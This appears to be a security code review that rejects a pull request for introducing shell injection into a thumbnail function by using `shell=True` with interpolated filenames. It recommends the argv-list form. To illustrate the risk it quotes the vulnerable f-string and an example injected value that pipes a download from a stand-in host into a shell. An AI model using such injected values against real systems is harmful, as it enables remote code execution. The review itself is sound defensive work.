findings.body:
Switching `subprocess.run` to `shell=True` and building the command with an f-string turns `upload_dir`, `name`, and `oid` into shell syntax. A value such as `x; curl evil.test|sh` (or `$(...)`, backticks, `|`) runs as a separate command on the host under the service account.

The argv-list form already invoked convert without a shell; keep that shape (or `magick` on IM7) and fix policy/delegate configuration separately. If a shell were ever unavoidable, pass a fixed argv to `convert` via env/`--` and never interpolate untrusted path segments into the command string.

```suggestion
    subprocess.run(
        ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        check=True,
    )
```

summary:
## Verdict

**Do not merge** — this change introduces shell injection in `make_thumb` by switching from an argv list to `subprocess.run(..., shell=True)` with unquoted interpolation of `upload_dir`, `name`, and `oid`.

## Narrative

The previous call used the safe argv-list form (`["/usr/bin/convert", src, dst]`), so metacharacters in filenames could not start a second command. The new form builds a single shell string:

```python
f"convert {upload_dir}/{name} /srv/thumbs/{oid}.png"
```

Any of those three values can break out of the intended `convert` invocation (`;`, `|`, `$(...)`, backticks, whitespace, glob characters). Upload pipelines commonly pass user-influenced names; even a partially validated `name` does not make `shell=True` safe once the values are concatenated into a shell command. The PR also drops the absolute `/usr/bin/convert` path, so PATH hijacking becomes relevant on the same runner.

ImageMagick 7 policy/delegate issues are real operational concerns, but they are solved with argv-form `magick`/`convert`, explicit policy configuration, or env — not by enabling the shell.

## Release decision

**Recommendation:** request-changes

verification.reason: The head version of thumbs.py runs `subprocess.run` with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid` into the shell command; the base used a fixed argv list without a shell. That is a real command-injection regression at critical severity.
